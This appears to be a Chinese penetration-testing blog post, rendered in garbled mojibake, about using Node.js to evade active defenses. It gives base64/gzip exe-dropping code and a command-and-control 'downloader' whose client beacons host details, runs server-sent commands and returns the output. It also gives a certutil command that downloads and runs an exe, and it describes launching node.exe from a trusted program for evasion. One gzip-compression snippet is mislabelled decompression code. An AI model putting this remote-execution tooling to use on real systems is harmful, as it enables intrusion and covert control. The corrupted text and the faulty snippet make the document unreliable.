I"¡@<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>Node.jsæ˜¯ä¸€ä¸ªåŸºäºChrome V8å¼•æ“çš„JavaScriptè¿è¡Œç¯å¢ƒ,ä½¿ç”¨äº†ä¸€ä¸ªäº‹ä»¶é©±åŠ¨ã€éé˜»å¡å¼I/Oçš„æ¨¡å‹ï¼Œä½¿å…¶è½»é‡åˆé«˜æ•ˆã€‚</p>

<p>æˆ‘æœ€è¿‘åœ¨ä¸€ç¯‡æ–‡ç« ä¸­å­¦åˆ°äº†åˆ©ç”¨Node.jsç»•è¿‡ä¸»åŠ¨é˜²å¾¡çš„æŠ€å·§ï¼Œäºæ˜¯å¯¹Node.jsçš„è¯­æ³•è¿›è¡Œäº†å­¦ä¹ ï¼Œå¼€æºä¸€ä¸ªDownloaderçš„å®ç°ä»£ç ï¼Œåˆ†äº«è„šæœ¬å¼€å‘ä¸­éœ€è¦æ³¨æ„çš„ç»†èŠ‚ã€‚</p>

<p>Node.jsç»•è¿‡ä¸»åŠ¨é˜²å¾¡çš„å­¦ä¹ åœ°å€ï¼š</p>

<p>https://bbs.pediy.com/thread-249573.htm</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>åŸºæœ¬æ¦‚å¿µ</li>
  <li>åˆ©ç”¨Node.jså®ç°çš„æ–‡ä»¶é‡Šæ”¾</li>
  <li>åˆ©ç”¨Node.jså®ç°çš„downloader</li>
  <li>åˆ©ç”¨æ€è·¯</li>
  <li>é˜²å¾¡å»ºè®®</li>
</ul>

<h2 id="0x02-åŸºæœ¬æ¦‚å¿µ">0x02 åŸºæœ¬æ¦‚å¿µ</h2>
<hr />

<h3 id="nodejsåŒjavascriptçš„åŒºåˆ«">Node.jsåŒJavaScriptçš„åŒºåˆ«</h3>

<p>JavaScriptæ˜¯ä¸€é—¨è¯­è¨€</p>

<p>Node.jsæ˜¯ä¸€ä¸ªåŸºäºChrome V8å¼•æ“çš„JavaScriptè¿è¡Œç¯å¢ƒ</p>

<p>è™½ç„¶åœ¨Windowså¹³å°ä¸‹ï¼ŒäºŒè€…çš„è„šæœ¬æ–‡ä»¶åç¼€åéƒ½æ˜¯.jsï¼Œä½†äºŒè€…ä¹‹é—´çš„åŒºåˆ«å¾ˆå¤§ï¼Œè¯­æ³•ä¹Ÿä¸åŒ</p>

<h3 id="nodejsçš„ä½¿ç”¨">Node.jsçš„ä½¿ç”¨</h3>

<p>å®˜æ–¹æ–‡æ¡£ï¼š</p>

<p>https://nodejs.org/api/</p>

<p>ä¸­æ–‡èµ„æ–™ï¼š</p>

<p>http://www.runoob.com/nodejs/nodejs-tutorial.html</p>

<p>ä¸‹è½½åœ°å€ï¼š</p>

<p>https://nodejs.org/en/download/</p>

<p>åœ¨Windowså¹³å°ä¸‹ï¼ŒNode.jsä»£ç ä¿å­˜åœ¨.jsåç¼€åçš„æ–‡ä»¶ä¸­ï¼Œé€šè¿‡node.exeåŠ è½½æ‰§è¡Œ</p>

<p>Node.jsæ”¯æŒç¬¬ä¸‰æ–¹åŒ…ï¼Œå¯é€šè¿‡npmå‘½ä»¤å®‰è£…æ¨¡å—ï¼Œå®ä¾‹å¦‚ä¸‹ï¼š</p>

<p>å®‰è£…webæ¡†æ¶æ¨¡å—expressï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>npm install express
</code></pre></div></div>

<p>ä½¿ç”¨æ¨¡å—expressï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var express = require('express');
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>æœ¬æ–‡æ¶‰åŠçš„ä»£ç å‡ä¸ä½¿ç”¨ç¬¬ä¸‰æ–¹åŒ…ï¼Œåªä½¿ç”¨å®‰è£…åŒ…ä¸­çš„node.exe</p>

<h2 id="0x03-åˆ©ç”¨nodejså®ç°çš„æ–‡ä»¶é‡Šæ”¾">0x03 åˆ©ç”¨Node.jså®ç°çš„æ–‡ä»¶é‡Šæ”¾</h2>
<hr />

<h3 id="å®ç°æ€è·¯">å®ç°æ€è·¯ï¼š</h3>

<p>å°†exeæ–‡ä»¶åšbase64ç¼–ç å­˜å‚¨åœ¨æ–‡ä»¶ä¸­ï¼Œé‡Šæ”¾æ—¶å…ˆè¯»å–æ–‡ä»¶è¿›è¡Œè§£ç ï¼Œæœ€åå†™å…¥æ–‡ä»¶</p>

<h4 id="1-è¯»å–æ–‡ä»¶å†…å®¹åšbase64ç¼–ç å¹¶è¾“å‡ºåˆ°datatxt">1. è¯»å–æ–‡ä»¶å†…å®¹ï¼Œåšbase64ç¼–ç å¹¶è¾“å‡ºåˆ°data.txt</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function base64_encode(file) {
	var fs = require('fs');
	var data = fs.readFileSync(file);
	return Buffer.from(data).toString('base64');
}
var base64str = base64_encode('test.exe');
console.log(base64str);
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p><code class="language-plaintext highlighter-rouge">fs.readFileSync</code>è¡¨ç¤ºåŒæ­¥è¯»å–ï¼Œå¼‚æ­¥è¯»å–ä½¿ç”¨<code class="language-plaintext highlighter-rouge">fs.readFile</code></p>

<p>æ‰§è¡Œï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node.js base64encode.js &gt;data.txt
</code></pre></div></div>

<h4 id="2-è¯»å–datatxtä¸­ä¿å­˜çš„åŠ å¯†å­—ç¬¦ä¸²base64è§£ç å¹¶ç”Ÿæˆæ–°çš„æ–‡ä»¶test2exe">2. è¯»å–data.txtä¸­ä¿å­˜çš„åŠ å¯†å­—ç¬¦ä¸²ï¼Œbase64è§£ç å¹¶ç”Ÿæˆæ–°çš„æ–‡ä»¶test2.exe</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function base64_decode(base64str, file) {
	var data = Buffer.from(base64str, 'base64');
    fs.writeFileSync(file, data);
}
var fs = require('fs');
var base64str = fs.readFileSync('data.txt');
console.log(base64str.toString());
base64_decode(base64str.toString(), 'test2.exe');
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>ä½¿ç”¨ä»£ç <code class="language-plaintext highlighter-rouge">var base64str = fs.readFileSync('data.txt');</code>åœ¨è¯»å–æ–‡ä»¶åï¼Œå˜é‡<strong>base64str</strong>éœ€è¦å¼ºåˆ¶è½¬æ¢æˆå­—ç¬¦ä¸²ç±»å‹ï¼Œå³<code class="language-plaintext highlighter-rouge">base64str.toString()</code></p>

<p>ä¸ºäº†ç¼©å°æ–‡ä»¶é•¿åº¦ï¼ŒåŠ å…¥å‹ç¼©ç®—æ³•gzip</p>

<h4 id="1-è¯»å–testexeä¸­çš„å†…å®¹åšgzipå‹ç¼©åä¿å­˜åˆ°æ–‡ä»¶datagz">1. è¯»å–test.exeä¸­çš„å†…å®¹ï¼Œåšgzipå‹ç¼©åä¿å­˜åˆ°æ–‡ä»¶data.gz</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function gunzip(sourcePath) {
	var zlib = require('zlib');
	var fs = require('fs');
  	var unzip = zlib.createGunzip(); 
  	var rs = fs.createReadStream(sourcePath); 
  	var ws = fs.createWriteStream('test2.exe');
  	rs.pipe(unzip).pipe(ws);
}
gunzip('data.gz');
</code></pre></div></div>

<h4 id="2-è¯»å–datagzä¸­çš„å†…å®¹åšgzipè§£å‹ç¼©åä¿å­˜åˆ°æ–‡ä»¶test2exe">2. è¯»å–data.gzä¸­çš„å†…å®¹ï¼Œåšgzipè§£å‹ç¼©åä¿å­˜åˆ°æ–‡ä»¶test2.exe</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var zlib = require('zlib');
var fs = require('fs');
function gunzip(sourcePath) {
  var unzip = zlib.createGunzip(); 
  var rs = fs.createReadStream(sourcePath); 
  var ws = fs.createWriteStream('test2.exe');
  rs.pipe(unzip).pipe(ws);
}
gunzip('data.gz');
</code></pre></div></div>

<h2 id="0x04-åˆ©ç”¨nodejså®ç°çš„downloader">0x04 åˆ©ç”¨Node.jså®ç°çš„downloader</h2>
<hr />

<h3 id="å®ç°æ€è·¯-1">å®ç°æ€è·¯ï¼š</h3>

<h4 id="1-server">1. Server</h4>

<ul>
  <li>ç›‘å¬æŒ‡å®šç«¯å£ï¼Œç­‰å¾…å®¢æˆ·ç«¯è¿æ¥ï¼Œè®°å½•å®¢æˆ·ç«¯çš„IPã€è¿æ¥æ—¶é—´å’Œpostæ•°æ®</li>
  <li>å¯¹å®¢æˆ·ç«¯çš„æ•°æ®åŒ…è¿›è¡Œç­›é€‰ï¼Œå¯¹ç¬¦åˆæ¡ä»¶1çš„å®¢æˆ·ç«¯è¿”å›æ§åˆ¶å‘½ä»¤ï¼Œå¯¹ç¬¦åˆæ¡ä»¶2çš„å®¢æˆ·ç«¯åœ¨å½“å‰æ§åˆ¶å°æ˜¾ç¤ºå®¢æˆ·ç«¯å‘æ¥çš„å‘½ä»¤æ‰§è¡Œç»“æœï¼Œå¦åˆ™è¿”å›404é¡µé¢</li>
</ul>

<h4 id="2-client">2. Client</h4>

<ul>
  <li>è¿æ¥æŒ‡å®šæœåŠ¡å™¨ï¼Œå‘é€å›ºå®šæ ¼å¼çš„postæ•°æ®ï¼ŒåŒ…æ‹¬å½“å‰ç³»ç»Ÿçš„ä¸»æœºåå’Œæ“ä½œç³»ç»Ÿç‰ˆæœ¬</li>
  <li>æ¥æ”¶æœåŠ¡å™¨è¿”å›çš„æ§åˆ¶å‘½ä»¤ï¼Œæ‰§è¡Œåå°†ç»“æœå†æ¬¡å‘é€åˆ°æœåŠ¡å™¨</li>
  <li>å¦‚æœæœåŠ¡å™¨æœªå“åº”ï¼Œç­‰å¾…ä¸€æ®µæ—¶é—´åå†æ¬¡å‘é€postè¯·æ±‚</li>
</ul>

<p>éœ€è¦è€ƒè™‘å¦‚ä¸‹é—®é¢˜ï¼š</p>

<h4 id="1-é€šè¿‡nodejsæ‰§è¡Œcmdå‘½ä»¤">1. é€šè¿‡Node.jsæ‰§è¡Œcmdå‘½ä»¤</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function runcmd(command) {
	var childprocess = require('child_process');
	childprocess.exec(command, (err, stdout, stderr) =&gt; {
  	if (err) {
    		console.error(err);
    		return;
  	}
  	console.log(stdout);
	});
}
runcmd('whoami');
</code></pre></div></div>

<h4 id="2-httpé€šä¿¡çš„å®ç°">2. HTTPé€šä¿¡çš„å®ç°</h4>

<p>Server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var http = require('http');
var querystring = require('querystring');
http.createServer(function (req, res) {
    	var body = '';
    	console.log('req.url:',req.url);
    	req.on('data', function (chunk) {
		body += chunk;
        	console.log("chunk:",chunk);
    	});
    	req.on('end', function () {
        	body = querystring.parse(body);  
        	console.log('body:',body);
        	res.write('Message from server');
        	res.end();
    	});
}).listen(3000,'0.0.0.0');
</code></pre></div></div>

<p>Client:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function sendHello(host1,port1){
	var http = require('http');	
	var querystring = require('querystring');
	var contents = querystring.stringify({
    		data1:'str1',
    		data2:'str2'	
	});
	var options = {
    		host: host1,
    		port: port1,
    		path: '/',
    		method:'POST',
    		headers:{
        		'Content-Type':'application/x-www-form-urlencoded',
        		'Content-Length':contents.length
    		}
	}
	console.log('post options:\n',options);
	console.log('content:',contents);

	var req = http.request(options, function(res){
    		console.log('headers:', res.headers);
    		var data1='';
    		res.on('data', function(chunk){
      			data1 += chunk;
    		});
    		res.on('end', function(){
      			console.log('result:',data1)
    		});
	});
	req.write(contents);
	req.end;
};
sendHello('127.0.0.1','3000');
</code></pre></div></div>

<p>Clientå‘Serverå‘é€postæ•°æ®ï¼Œå†…å®¹ä¸º<code class="language-plaintext highlighter-rouge">data1=str1&amp;data2=str2</code></p>

<p>Serveræ”¶åˆ°è¯·æ±‚åï¼Œå‘Clientå›å¤çš„å†…å®¹ä¸º<code class="language-plaintext highlighter-rouge">Message from server</code></p>

<h4 id="3-sleepçš„å®ç°">3. sleepçš„å®ç°</h4>

<p>Node.jsé»˜è®¤ä¸æ”¯æŒsleepæ“ä½œï¼Œè¿™é‡Œå¯ä»¥è‡ªå·±å®ç°ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function sleep(milliSeconds){
	var startTime =new Date().getTime();
	while(new Date().getTime()&lt; startTime + milliSeconds);
}
var timeinterval = +'5000';
sleep(timeinterval);
</code></pre></div></div>

<p>å­—ç¬¦ä¸²ç±»å‹è½¬æ¢ä¸ºæ•°å­—ï¼Œå¯åœ¨å‰é¢åŠ <code class="language-plaintext highlighter-rouge">+</code></p>

<h4 id="4-clientå®šæ—¶å¾ªç¯å‘é€postè¯·æ±‚">4. Clientå®šæ—¶å¾ªç¯å‘é€postè¯·æ±‚</h4>

<p>è¿™é‡Œéœ€è¦è€ƒè™‘å¼‚æ­¥å’ŒåŒæ­¥çš„é—®é¢˜</p>

<p>Node.jsæ˜¯å¼‚æ­¥ç¼–ç¨‹ï¼Œä½†Clientå®šæ—¶å¾ªç¯å‘é€postè¯·æ±‚éœ€è¦ä½¿ç”¨åŒæ­¥å®ç°ï¼Œæµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p>

<p>Server:</p>

<p>ä»£ç åŒä¸Š</p>

<p>Client:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function sleep(milliSeconds){
	var startTime =new Date().getTime();
	while(new Date().getTime()&lt; startTime + milliSeconds);
}
function sendHello(host1,port1){
	var http = require('http');	
	var querystring = require('querystring');
	var contents = querystring.stringify({
    		data1:'str1',
    		data2:'str2'	
	});
	var options = {
    		host: host1,
    		port: port1,
    		path: '/',
    		method:'POST',
    		headers:{
        		'Content-Type':'application/x-www-form-urlencoded',
        		'Content-Length':contents.length
    		}
	}
	console.log('post options:\n',options);
	console.log('content:',contents);

	var req = http.request(options, function(res){
    		console.log('headers:', res.headers);
    		var data1='';
    		res.on('data', function(chunk){
      			data1 += chunk;
    		});
    		res.on('end', function(){
      			console.log('result:',data1)
    		});
	});
	req.write(contents);
	req.end;
};
while (true)
{
	console.log('1');
	sleep(5000);
	sendHello('127.0.0.1','3000');
}
</code></pre></div></div>

<p><strong>æœŸå¾…çš„ç»“æœï¼š</strong></p>

<p>Clinetæ¯éš”5ç§’å‘é€ä¸€ä¸ªpostè¯·æ±‚ï¼Œæ¥æ”¶ç»“æœ</p>

<p><strong>å®é™…çš„ç»“æœï¼š</strong></p>

<p>æ¯éš”5ç§’æ‰§è¡Œä¸€æ¬¡å¾ªç¯ï¼Œä½†Clinetæ²¡æœ‰å‘å‡ºè¯·æ±‚</p>

<p>ç”±äºæˆ‘ä»¬æœ€åˆçš„è®¾æƒ³æ˜¯ä¸ä½¿ç”¨npmï¼Œæ‰€ä»¥ä¹Ÿæ— æ³•ä½¿ç”¨asyncæ¨¡å—å®ç°åŒæ­¥</p>

<p>æœ€ç»ˆï¼Œæˆ‘é€šè¿‡æ–¹æ³•åµŒå¥—è§£å†³äº†åŒæ­¥é—®é¢˜ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function sleep(milliSeconds){
	var startTime =new Date().getTime();
	while(new Date().getTime()&lt; startTime + milliSeconds);
}
function A(){
	console.log('A');
	B();	
}
function B(){
	console.log('B');
	sleep(5000);
	A();	
}
A();
</code></pre></div></div>

<h4 id="5-serveræ˜¾ç¤ºclientçš„ip">5. Serveræ˜¾ç¤ºClientçš„IP</h4>

<p>ä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function getClientIp(req) {
        return req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        req.connection.socket.remoteAddress;
};
</code></pre></div></div>

<p>é»˜è®¤ä¸ºæ ¼å¼ä¸ºipv6ï¼Œä¾‹å¦‚ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>::ffff:127.0.0.1
</code></pre></div></div>

<p>å¯ä»¥é€šè¿‡ä¿®æ”¹listençš„å‚æ•°æŒ‡å®šä¸ºipv4</p>

<p>ä¿®æ”¹å‰ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.listen(3000);
</code></pre></div></div>

<p>ä¿®æ”¹åï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.listen(3000,'0.0.0.0');
</code></pre></div></div>

<h4 id="6-serveråˆ¤æ–­postè¯·æ±‚ä¸ç¬¦åˆè¦æ±‚çš„å›å¤404">6. Serveråˆ¤æ–­postè¯·æ±‚ï¼Œä¸ç¬¦åˆè¦æ±‚çš„å›å¤404</h4>

<p>å¯¹bodyçš„å†…å®¹è¿›è¡Œåˆ¤æ–­å³å¯</p>

<p>å®Œæ•´å®ç°ä»£ç å·²å¼€æºï¼Œåœ°å€ï¼š</p>

<p>https://github.com/3gstudent/NodeJS-Downloader</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>å¼€æºçš„ä»£ç ä»…ä»…æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œç”¨ä½œæ¼”ç¤ºNodeJSçš„åŠŸèƒ½</p>

<p>ç”¨æ³•å¦‚ä¸‹ï¼š</p>

<p>éœ€è¦å…ˆè·å¾—node.exeï¼Œä¸‹è½½åœ°å€ï¼š https://nodejs.org/en/download/</p>

<h4 id="1-ç¼–è¾‘æ–‡ä»¶serverjs">1. ç¼–è¾‘æ–‡ä»¶Server.js</h4>

<p>å¯ç¼–è¯‘ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>å‘Clientå‘é€çš„å‘½ä»¤ï¼š<code class="language-plaintext highlighter-rouge">var command</code></li>
  <li>ç›‘å¬ç«¯å£ï¼š <code class="language-plaintext highlighter-rouge">.listen(80,'0.0.0.0');</code></li>
</ul>

<h4 id="2-å¯åŠ¨server">2. å¯åŠ¨Server</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node.exe Server.js
</code></pre></div></div>

<p>ç›‘å¬æŒ‡å®šç«¯å£ï¼Œç­‰å¾…å®¢æˆ·ç«¯è¿æ¥ï¼Œè®°å½•å®¢æˆ·ç«¯çš„IPã€è¿æ¥æ—¶é—´å’Œpostæ•°æ®</p>

<p>å¯¹å®¢æˆ·ç«¯çš„æ•°æ®åŒ…è¿›è¡Œç­›é€‰ï¼Œå¯¹åˆæ¬¡è®¿é—®çš„å®¢æˆ·ç«¯è¿”å›æ§åˆ¶å‘½ä»¤ï¼Œå¯¹ç¬¬äºŒæ¬¡è®¿é—®çš„å®¢æˆ·ç«¯åœ¨å½“å‰æ§åˆ¶å°æ˜¾ç¤ºå®¢æˆ·ç«¯å‘æ¥çš„å‘½ä»¤æ‰§è¡Œç»“æœï¼Œå¦åˆ™è¿”å›404é¡µé¢</p>

<h4 id="3-ç¼–è¾‘æ–‡ä»¶clientjs">3. ç¼–è¾‘æ–‡ä»¶Client.js</h4>

<p>å¯ç¼–è¯‘ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>Serverçš„IPï¼š<code class="language-plaintext highlighter-rouge">var serverip</code></li>
  <li>Serverçš„ç«¯å£ï¼š<code class="language-plaintext highlighter-rouge">var serverport</code></li>
  <li>å¾ªç¯é—´éš”æ—¶é—´ï¼š<code class="language-plaintext highlighter-rouge">var timeinterval</code></li>
</ul>

<h4 id="4-å¯åŠ¨client">4. å¯åŠ¨Client</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>node.exe Client.js
</code></pre></div></div>

<p>Clientå°†ä¼šè¿æ¥Serverï¼Œå‘é€å›ºå®šæ ¼å¼çš„postæ•°æ®ï¼ŒåŒ…æ‹¬å½“å‰ç³»ç»Ÿçš„ä¸»æœºåå’Œæ“ä½œç³»ç»Ÿç‰ˆæœ¬</p>

<p>æ¥ä¸‹æ¥æ¥æ”¶Serverè¿”å›çš„æ§åˆ¶å‘½ä»¤ï¼Œæ‰§è¡Œåå°†ç»“æœå†æ¬¡å‘é€åˆ°Server</p>

<p>å¦‚æœServeræœªå“åº”ï¼Œç­‰å¾…ä¸€æ®µæ—¶é—´åå†æ¬¡å‘é€postè¯·æ±‚</p>

<h2 id="0x05-åˆ©ç”¨æ€è·¯">0x05 åˆ©ç”¨æ€è·¯</h2>
<hr />

<h4 id="1å¼€æºçš„ä»£ç æ”¯æŒå¤šç§payload">1ã€å¼€æºçš„ä»£ç æ”¯æŒå¤šç§payload</h4>

<p>å¯å°†payloadè®¾ç½®ä¸ºä¸‹è½½æ–‡ä»¶å¹¶æ‰§è¡Œï¼Œä¾‹å¦‚</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var command = 'certutil -urlcache -split -f https://github.com/3gstudent/test/raw/master/putty.exe c:\\a.exe&amp;&amp;c:\\a.exe';
</code></pre></div></div>

<p>æ›´å¤šä¸‹è½½æ‰§è¡Œçš„å‘½ä»¤å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8Egithub%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95">ã€Šæ¸—é€æŠ€å·§â€”â€”ä»githubä¸‹è½½æ–‡ä»¶çš„å¤šç§æ–¹æ³•ã€‹</a></p>

<p><strong>æ³¨ï¼š</strong></p>

<p>å‘é€Clienté€€å‡ºçš„å‘½ä»¤å¯ä½¿ç”¨ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var command = 'taskkill /f /im node.exe';
</code></pre></div></div>

<h4 id="2å¯è¢«ç¬¬ä¸‰æ–¹å¯ä¿¡ç¨‹åºåŠ è½½">2ã€å¯è¢«ç¬¬ä¸‰æ–¹å¯ä¿¡ç¨‹åºåŠ è½½</h4>

<p>å‚è€ƒï¼š</p>

<p>https://bbs.pediy.com/thread-249573.htm</p>

<p><code class="language-plaintext highlighter-rouge">t.exe</code>-&gt;<code class="language-plaintext highlighter-rouge">node.exe</code>-&gt;<code class="language-plaintext highlighter-rouge">main.js</code></p>

<p>æ¼”ç¤ºå¦‚å›¾ï¼š</p>

<p><img src="https://github.com/3gstudent/NodeJS-Downloader/blob/master/1.png?raw=true" alt="Alt text" /></p>

<h2 id="0x06-é˜²å¾¡å»ºè®®">0x06 é˜²å¾¡å»ºè®®</h2>
<hr />

<p>å¯¹t.exeçš„å­è¿›ç¨‹(node.exe)è¡Œä¸ºè¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœæœ‰å¯ç–‘è¡Œä¸ºè¿›è¡Œæ‹¦æˆª</p>

<h2 id="0x07-å°ç»“">0x07 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡ä»‹ç»äº†åœ¨å¼€å‘Node.jsä»£ç æ—¶éœ€è¦æ³¨æ„çš„ç»†èŠ‚ï¼Œå¼€æºäº†ä¸€æ®µDownloaderçš„æµ‹è¯•ä»£ç ï¼Œç”¨æ¥æ¼”ç¤ºNode.jsçš„åŠŸèƒ½ã€‚</p>

<p>ç®€è¦åˆ†æåœ¨æ¸—é€æµ‹è¯•ä¸­çš„åˆ©ç”¨æ€è·¯ï¼Œç»™å‡ºé˜²å¾¡å»ºè®®ã€‚</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET